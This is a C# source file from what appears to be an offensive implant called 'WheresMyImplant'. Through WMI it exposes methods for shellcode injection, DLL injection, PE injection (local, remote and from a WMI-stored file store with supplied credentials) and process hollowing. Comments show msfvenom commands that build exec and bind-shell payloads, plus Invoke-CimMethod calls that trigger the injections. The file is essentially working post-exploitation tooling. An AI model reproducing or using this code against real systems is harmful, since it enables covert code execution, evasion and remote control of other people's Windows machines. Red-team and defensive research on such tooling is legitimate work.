using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Management.Instrumentation;
using System.Text;

namespace WheresMyImplant
{
    public partial class Implant
    {
        [ManagementTask]
        //msfvenom -p windows/x64/exec --format csharp CMD=calc.exe
        //Invoke-CimMethod -Class Win32_Implant -Name InjectShellCode -Argument @{shellCodeString=$payload; processId=432}
        public static string InjectShellCode(string shellCodeString, String strProcessId)
        {
            Int32 dwProcessId = 0;
            if (String.IsNullOrEmpty(strProcessId))
            {
                using (InjectShellCode injectShellCode = new InjectShellCode(shellCodeString))
                {
                    injectShellCode.Execute();
                    return injectShellCode.GetOutput();
                }
            }
            else if (Int32.TryParse(strProcessId, out dwProcessId))
            {
                using (InjectShellCodeRemote injectShellCodeRemote = new InjectShellCodeRemote(shellCodeString, (UInt32)dwProcessId))
                {
                    injectShellCodeRemote.Execute();
                    return injectShellCodeRemote.GetOutput();
                }
            }
            else
            {
                return "Invalid Process ID";
            }
        }

        [ManagementTask]
        public static string InjectShellCodeWMIFSB64(String wmiClass, String fileName, Int32 processId)
        {
            Byte[] peBytes = Misc.QueryWMIFS(wmiClass, fileName);
            String shellCodeString = System.Text.Encoding.Unicode.GetString(peBytes);

            InjectShellCodeRemote injectShellCodeRemote = new InjectShellCodeRemote(shellCodeString, (UInt32)processId);
            return injectShellCodeRemote.GetOutput();
        }

        // Todo: Add Auto Token Privilege Elevation
        [ManagementTask]
        //http://www.codingvision.net/miscellaneous/c-inject-a-dll-into-a-process-w-createremotethread
        //msfvenom -p windows/x64/shell_bind_tcp --format dll --arch x64 > /tmp/bind64.dll
        //Invoke-CimMethod -ClassName Win32_Implant -Name InjectDll -Arguments @{library = "C:\bind64.dll"; processId = 3372}
        public static String LoadDll(String library, String strProcessId)
        {
            Int32 dwProcessId = 0;
            if (String.IsNullOrEmpty(strProcessId))
            {
                LoadDll injectDll = new LoadDll(library);
                return injectDll.GetOutput();
            }
            else if (Int32.TryParse(strProcessId, out dwProcessId))
            {
                String output;
                using (LoadDllRemote injectDllRemote = new LoadDllRemote(library, (UInt32)dwProcessId))
                {
                    UInt32 size = 0;
                    //Misc.GetModuleAddress("kernel32.dll", (UInt32)dwProcessId, ref size);
                    injectDllRemote.Execute();
                    output = injectDllRemote.GetOutput();
                }
                return output;
            }
            else
            {
                return "Invalid Process ID";
            }
        }

        [ManagementTask]
        //Invoke-CimMethod -ClassName Win32_Implant -Name InjectPE -Arguments @{processId="5648"; fileName="C:\bind64.exe"; parameters=""}
        public static string InjectPE(String processId, String fileName, String parameters)
        {
            StringBuilder output = new StringBuilder();
            using (Tokens tokens = new Tokens())
            {
                using (PELoader peLoader = new PELoader())
                {
                    peLoader.Execute(fileName);

                    Int32 dwProcessId;
                    try
                    {
                        if (!Int32.TryParse(processId, out dwProcessId))
                        {
                            InjectPE injectPE = new InjectPE(peLoader, parameters);
                            output.Append(injectPE.GetOutput());
                        }
                        else
                        {
                            InjectPERemote injectPE = injectPE = new InjectPERemote((UInt32)dwProcessId, peLoader, parameters);
                            try
                            {
                                injectPE.Execute();
                            }
                            catch (Exception error)
                            {
                                output.Append(error.ToString());
                                output.Append("[-] Execution Failed\n");
                            }
                            finally
                            {
                                output.Append(injectPE.GetOutput());
                            }
                        }
                    }
                    catch (FormatException error)
                    {
                        error = null;
                        output.Append("[*] Unable to Parse Process ID");
                        InjectPE injectPE = new InjectPE(peLoader, parameters);
                        output.Append(injectPE.GetOutput());
                    }
                    catch (Exception error)
                    {
                        output.Append("[-] Unhandled Exception Occured");
                        output.Append(error.ToString());
                    }
                }
            }
            return output.ToString();
        }

        [ManagementTask]
        public static string InjectPEString(Int32 processId, String peString, String parameters)
        {
            string output = "";

            PELoader peLoader = new PELoader();
            peLoader.Execute(System.Convert.FromBase64String(peString));

            InjectPE injectPE = new InjectPE(peLoader, parameters);
            output += injectPE.GetOutput();
            return output;
        }

        [ManagementTask]
        public static string InjectPEWMIFS(Int32 processId, String wmiClass, String fileName, String parameters)
        {
            string output = "";

            Byte[] peBytes = Misc.QueryWMIFS(wmiClass, fileName);
            PELoader peLoader = new PELoader();
            peLoader.Execute(peBytes);

            InjectPERemote injectPE = new InjectPERemote((UInt32)processId, peLoader, parameters);
            try
            {
                injectPE.Execute();
            }
            catch
            {
                output = "[-] Execution Failed\n";
            }
            finally
            {
                output += injectPE.GetOutput();
            }
            return output;
        }

        [ManagementTask]
        public static string InjectPEWMIFSRemote(Int32 processId, String wmiClass, String system, String username, String password, String fileName, String parameters)
        {
            StringBuilder output = new StringBuilder();

            ConnectionOptions options = new ConnectionOptions();

            options.Username = username;
            options.Password = password;

            ManagementScope scope = new ManagementScope("\\\\" + system + "\\root\\cimv2", options);
            scope.Connect();

            ObjectQuery queryIndexCount = new ObjectQuery("SELECT Index FROM WMIFS WHERE FileName = \'" + fileName + "\'");
            ManagementObjectSearcher searcherIndexCount = new ManagementObjectSearcher(scope, queryIndexCount);
            ManagementObjectCollection queryIndexCollection = searcherIndexCount.Get();
            int indexCount = queryIndexCollection.Count;

            String EncodedText = "";
            for (int i = 0; i < indexCount; i++)
            {
                ObjectQuery queryFilePart = new ObjectQuery("SELECT FileStore FROM WMIFS WHERE FileName = \'" + fileName + "\' AND Index = \'" + i + "\'");
                ManagementObjectSearcher searcherFilePart = new ManagementObjectSearcher(scope, queryFilePart);
                ManagementObjectCollection queryCollection = searcherFilePart.Get();
                foreach (ManagementObject filePart in queryCollection)
                {
                    EncodedText += filePart["FileStore"].ToString();
                }
            }

            Byte[] peBytes = System.Convert.FromBase64String(EncodedText);
            PELoader peLoader = new PELoader();
            peLoader.Execute(peBytes);
            InjectPERemote injectPE = new InjectPERemote((UInt32)processId, peLoader, parameters);
            try
            {
                injectPE.Execute();
            }
            catch
            {
                output.Append("[-] Execution Failed\n");
            }
            finally
            {
                output.Append(injectPE.GetOutput());
            }
            return output.ToString();
        }

        [ManagementTask]
        public static String HollowProcess(String target, String replacement, String wait)
        {
            Boolean bWait;
            if (!Boolean.TryParse(wait, out bWait))
            {
                return "Unable to parse wait parameter (true, false)";
            }

            HollowProcess hp = new HollowProcess();
            if (!hp.ReadSourceImageFile(replacement))
            {
                return hp.GetOutput();
            }

            if (!hp.CreateSuspendedProcess(target))
            {
                return hp.GetOutput();
            }

            if (!hp.RemapImage())
            {
                return hp.GetOutput();
            }

            if (!hp.ResumeProcess(bWait))
            {
                return hp.GetOutput();
            }

            return hp.GetOutput() + "\nProcess Hollowed";
        }

        [ManagementTask]
        public static String HollowProcessString(String target, String replacement, String wait)
        {
            Boolean bWait;
            if (!Boolean.TryParse(wait, out bWait))
            {
                return "Unable to parse wait parameter (true, false)";
            }

            StringBuilder output = new StringBuilder();
            HollowProcess hp = new HollowProcess();
            if (!hp.ReadSourceImageString(replacement))
            {
                return output.ToString();
            }

            if (!hp.CreateSuspendedProcess(target))
            {
                return output.ToString();
            }

            if (!hp.RemapImage())
            {
                return output.ToString();
            }

            if (!hp.ResumeProcess(bWait))
            {
                return output.ToString();
            }

            output.Append("Process Hollowed");
            return output.ToString();
        }
    }
}
